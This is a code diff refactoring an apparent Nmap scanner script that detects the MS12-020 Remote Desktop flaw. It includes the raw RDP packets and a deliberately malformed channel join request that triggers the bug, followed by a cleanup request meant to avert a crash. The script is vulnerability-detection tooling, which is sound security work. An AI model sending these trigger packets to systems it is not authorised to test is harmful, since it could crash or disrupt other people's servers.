@@ -71,67 +71,107 @@ categories = {"intrusive", "vuln"}
 
 portrule = shortport.port_or_service({3389},{"ms-wbt-server"})
 
-action = function(host, port)
+-- see http://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx for more info
+local connectionRequest = "\x03\x00" -- TPKT Header version 03, reserved 0
+.. "\x00\x0b" -- Length
+.. "\x06"   -- X.224 Data TPDU length
+.. "\xe0"    -- X.224 Type (Connection request)
+.. "\x00\x00" -- dst reference
+.. "\x00\x00" -- src reference
+.. "\x00" -- class and options
+
+-- see http://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx
+local connectInitial = "\x03\x00\x00\x65" -- TPKT Header
+.. "\x02\xf0\x80" -- Data TPDU, EOT
+.. "\x7f\x65\x5b" -- Connect-Initial
+.. "\x04\x01\x01" -- callingDomainSelector
+.. "\x04\x01\x01" -- calledDomainSelector
+.. "\x01\x01\xff" -- upwardFlag
+.. "\x30\x19" -- targetParams + size
+..  "\x02\x01\x22" -- maxChannelIds
+..  "\x02\x01\x20" -- maxUserIds
+..  "\x02\x01\x00" -- maxTokenIds
+..  "\x02\x01\x01" -- numPriorities
+..  "\x02\x01\x00" -- minThroughput
+..  "\x02\x01\x01" -- maxHeight
+..  "\x02\x02\xff\xff" -- maxMCSPDUSize
+..  "\x02\x01\x02" -- protocolVersion
+.. "\x30\x18" -- minParams + size
+.. "\x02\x01\x01" -- maxChannelIds
+.. "\x02\x01\x01" -- maxUserIds
+.. "\x02\x01\x01" -- maxTokenIds
+.. "\x02\x01\x01" -- numPriorities
+.. "\x02\x01\x00" -- minThroughput
+.. "\x02\x01\x01" -- maxHeight
+.. "\x02\x01\xff" -- maxMCSPDUSize
+.. "\x02\x01\x02" -- protocolVersion
+.. "\x30\x19" -- maxParams + size
+.. "\x02\x01\xff" -- maxChannelIds
+.. "\x02\x01\xff" -- maxUserIds
+.. "\x02\x01\xff" -- maxTokenIds
+.. "\x02\x01\x01" -- numPriorities
+.. "\x02\x01\x00" -- minThroughput
+.. "\x02\x01\x01" -- maxHeight
+.. "\x02\x02\xff\xff" -- maxMCSPDUSize
+.. "\x02\x01\x02" -- protocolVersion
+.. "\x04\x00" -- userData
+
+-- see http://msdn.microsoft.com/en-us/library/cc240835%28v=prot.10%29.aspx
+local userRequest = "\x03\x00" -- header
+.. "\x00\x08" -- length
+.. "\x02\xf0\x80" -- X.224 Data TPDU (2 bytes: 0xf0 = Data TPDU, 0x80 = EOT, end of transmission)
+.. "\x28" -- PER encoded PDU contents
+
+local function do_check(host, port)
+  local is_vuln = false
   local socket = nmap.new_socket()
-  local status, err,response
+  -- If any socket call fails, bail.
+  local catch = function ()
+    socket:close()
+  end
+  local try = nmap.new_try(catch)
 
-  -- see http://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx for more info
-  local connectionRequestStr = "0300" -- TPKT Header version 03, reserved 0
-  .. "000b" -- Length
-  .. "06"   -- X.224 Data TPDU length
-  .. "e0"    -- X.224 Type (Connection request)
-  .. "0000" -- dst reference
-  .. "0000" -- src reference
-  .. "00" -- class and options
-  local connectionRequest = stdnse.fromhex(connectionRequestStr)
+  try(socket:connect(host, port))
+  try(socket:send(connectionRequest))
 
-  -- see http://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx
-  local connectInitialStr = "03000065" -- TPKT Header
-  .. "02f080" -- Data TPDU, EOT
-  .. "7f655b" -- Connect-Initial
-  .. "040101" -- callingDomainSelector
-  .. "040101" -- calledDomainSelector
-  .. "0101ff" -- upwardFlag
-  .. "3019" -- targetParams + size
-  ..  "020122" -- maxChannelIds
-  ..  "020120" -- maxUserIds
-  ..  "020100" -- maxTokenIds
-  ..  "020101" -- numPriorities
-  ..  "020100" -- minThroughput
-  ..  "020101" -- maxHeight
-  ..  "0202ffff" -- maxMCSPDUSize
-  ..  "020102" -- protocolVersion
-  .. "3018" -- minParams + size
-  .. "020101" -- maxChannelIds
-  .. "020101" -- maxUserIds
-  .. "020101" -- maxTokenIds
-  .. "020101" -- numPriorities
-  .. "020100" -- minThroughput
-  .. "020101" -- maxHeight
-  .. "0201ff" -- maxMCSPDUSize
-  .. "020102" -- protocolVersion
-  .. "3019" -- maxParams + size
-  .. "0201ff" -- maxChannelIds
-  .. "0201ff" -- maxUserIds
-  .. "0201ff" -- maxTokenIds
-  .. "020101" -- numPriorities
-  .. "020100" -- minThroughput
-  .. "020101" -- maxHeight
-  .. "0202ffff" -- maxMCSPDUSize
-  .. "020102" -- protocolVersion
-  .. "0400" -- userData
-  local connectInitial = stdnse.fromhex(connectInitialStr)
+  local rdp_banner = "\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00"
+  local response = try(socket:receive_bytes(#rdp_banner))
+  if response ~= rdp_banner then
+    --probably not rdp at all
+    stdnse.debug1("not RDP")
+    return false
+  end
+  try(socket:send(connectInitial))
+  try(socket:send(userRequest))  -- send attach user request
+  response = try(socket:receive_bytes(12)) -- receive attach user confirm
+  local user1 = string.unpack(">I2", response, 10) -- user_channel-1001 - see http://msdn.microsoft.com/en-us/library/cc240918%28v=prot.10%29.aspx
 
-  -- see http://msdn.microsoft.com/en-us/library/cc240835%28v=prot.10%29.aspx
-  local userRequestStr = "0300" -- header
-  .. "0008" -- length
-  .. "02f080" -- X.224 Data TPDU (2 bytes: 0xf0 = Data TPDU, 0x80 = EOT, end of transmission)
-  .. "28" -- PER encoded PDU contents
-  local userRequest = stdnse.fromhex(userRequestStr)
+  try(socket:send(userRequest)) -- send another attach user request
+  response = try(socket:receive_bytes(12)) -- receive another attach user confirm
+  local user2 = string.unpack(">I2", response, 10) -- second user's channel - 1001
+  user2 = user2+1001 -- second user's channel
+  local data4 = string.pack(">I2I2", user1, user2)
+  local data5 = "\x03\x00\x00\x0c\x02\xf0\x80\x38" -- channel join request TPDU
+  local channelJoinRequest = data5 .. data4
+  try(socket:send(channelJoinRequest)) -- bogus channel join request user1 requests channel of user2
+  response = try(socket:receive_bytes(9))
+  if response:sub(8,9) == "\x3e\x00" then
+    -- 3e00 indicates a successful join
+    -- see http://msdn.microsoft.com/en-us/library/cc240911%28v=prot.10%29.aspx
+    -- service is vulnerable
+    is_vuln = true
+    -- send a valid request to prevent the BSoD
+    data4 = string.pack(">I2I2", user2 - 1001, user2)
+    channelJoinRequest = data5 .. data4 -- valid join request
+    -- Don't bother checking these; we know it's vulnerable and are just cleaning up.
+    socket:send(channelJoinRequest)
+    local _, _ = socket:receive_bytes(0)
+  end
+  socket:close()
+  return is_vuln
+end
 
-  local user1,user2
-  local pos
-
+action = function(host, port)
   local rdp_vuln_0152  = {
     title = "MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability",
     IDS = {CVE = 'CVE-2012-0152'},
@@ -180,44 +220,18 @@ action = function(host, port)
   -- handshake. In my tests, sleep values above 0.1s prevent the connection reset.
   stdnse.sleep(0.2)
 
-  socket:connect(host.ip, port)
-  status, err = socket:send(connectionRequest)
-
-  status, response = socket:receive_bytes(0)
-  if response ~= stdnse.fromhex("0300000b06d00000123400") then
-    --probably not rdp at all
-    stdnse.debug1("not RDP")
-    return nil
-  end
-  status, err = socket:send(connectInitial)
-  status, err = socket:send(userRequest)  -- send attach user request
-  status, response = socket:receive_bytes(0) -- receive attach user confirm
-  user1, pos = string.unpack(">I2", response, 10) -- user_channel-1001 - see http://msdn.microsoft.com/en-us/library/cc240918%28v=prot.10%29.aspx
-
-  status, err = socket:send(userRequest) -- send another attach user request
-  status, response = socket:receive_bytes(0) -- receive another attach user confirm
-  user2, pos = string.unpack(">I2", response, 10) -- second user's channel - 1001
-  user2 = user2+1001 -- second user's channel
-  local data4 = string.pack(">I2I2", user1, user2)
-  local data5 = stdnse.fromhex("0300000c02f08038") -- channel join request TPDU
-  local channelJoinRequest = data5 .. data4
-  status, err = socket:send(channelJoinRequest) -- bogus channel join request user1 requests channel of user2
-  status, response = socket:receive_bytes(0)
-  if response:sub(8,9) == stdnse.fromhex("3e00") then
-    -- 3e00 indicates a successful join
-    -- see http://msdn.microsoft.com/en-us/library/cc240911%28v=prot.10%29.aspx
-    -- service is vulnerable
-    -- send a valid request to prevent the BSoD
-    data4 = string.pack(">I2I2", user2 - 1001, user2)
-    channelJoinRequest = data5 .. data4 -- valid join request
-    status, err = socket:send(channelJoinRequest)
-    status, response = socket:receive_bytes(0)
-    socket:close()
+  local status, is_vuln = pcall(do_check, host, port)
+  if not status then
+    -- A socket or data unpacking error means the POC didn't work as expected
+    -- Report the error in case we actually need to fix something.
+    -- Kinda wish we had a LIKELY_NOT_VULN
+    local result = ("Server response not as expected: %s"):format(is_vuln)
+    rdp_vuln_0152.check_results = result
+    rdp_vuln_0002.check_results = result
+  elseif is_vuln then
     rdp_vuln_0152.state = vulns.STATE.VULN
     rdp_vuln_0002.state = vulns.STATE.VULN
-    return report:make_output(rdp_vuln_0152,rdp_vuln_0002)
   end
-  --service is not vulnerable
-  socket:close()
+
   return report:make_output(rdp_vuln_0152,rdp_vuln_0002)
 end
